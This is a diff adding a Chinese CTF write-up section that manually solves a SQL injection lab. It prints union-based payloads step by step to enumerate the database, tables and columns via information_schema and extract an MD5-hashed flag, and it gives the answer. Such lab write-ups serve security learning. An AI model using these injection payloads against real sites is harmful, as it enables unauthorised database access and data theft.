@@ -280,7 +280,7 @@ GET请求的方法十分简单就是在url后面加上`?a=1`就行了
 
 这题所需的工具是`sqlmap`
 
-# 作业sql注入
+### 作业sql注入
 
 打开靶场后查看页面信息，发现有一个名为id的参数是可变的
 
@@ -765,7 +765,75 @@ Database: yucctf
 
 然后成功解出密文，不过是chen一下子突然不自信了...(汗颜)
 
+### 手注解法
 
+打开页面后发现能交互的只有url栏，而可变参数为id=1
+
+尝试一下改变id的值
+
+![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200816101.webp)
+
+页面发生变化，再看看他是怎么闭合语句的
+
+![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200817314.webp)
+
+可以看到，他不是双引号闭合，因为双引号也被当成字符串传递进去了
+
+![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200817782.webp)
+
+但是当以'结尾时发现语句闭合，页面无回显，证明单引号闭合
+
+![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200819680.webp)
+
+按照这个规律写了一个时间延时，发现语句生效，证明我们输入进去的数据被当成代码执行了说明这里一定存在SQL注入点
+
+现在来以这个为模板查询一下字段
+
+![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200821659.webp)
+
+该数据库一共有三个字段因为当order by 4 时页面没有了回显，估计是报错被屏蔽了
+
+![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200822008.webp)
+
+现在已经知道了字段数，接下来是查看库名使用命令`/?id=2' and 1=2 union select 1,database(),3 -- dwada`
+
+![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200824443.webp)
+
+得到这个数据所在的库名为message。再看看里面有什么表
+
+`?id=2' and 1=2 union select 1,table_name,3 from information_schema.tables where table_schema='message' -- dawdw`
+
+![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200827249.webp)
+
+这个库下有一个叫flag的表
+
+使用limit函数发现这个表下一共有三个表，分别是flag、user、username
+
+用法`?id=2' and 1=2 union select 1,table_name,3 from information_schema.tables where table_schema='message' limit 0,1  -- dawdw`
+
+通过不断改变0,1 1,1 2,1 就可以知道每个表的名字，当到3,1时页面没了回显
+
+接下来就看看flag表里有什么字段，因为他看起来比user和username更加可能存在flag
+
+命令`?id=2' and 1=2 union select 1,column_name,3 from information_schema.columns where tabels_chema='message' and table_name='flag' limit 0,1 -- dawd`
+
+![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200837920.webp)
+
+发现这个flag表下一共有两个字段分别是flag、id，那我们就继续查看flag表里的flag字段
+
+`?id=2' and 1=2 union select 1,flag,3 from flag -- dawd`
+
+![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200840482.webp)
+
+成功拿下flag，不过这个flag是被md5加密后的，需要拿去解密一下
+
+`flag{a1a8887793acfc199182a649e905daab}`
+
+![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304200841047.webp)
+
+flag里的东西解密后就是chen所以答案是
+
+`flag{chen}`
 
 
 
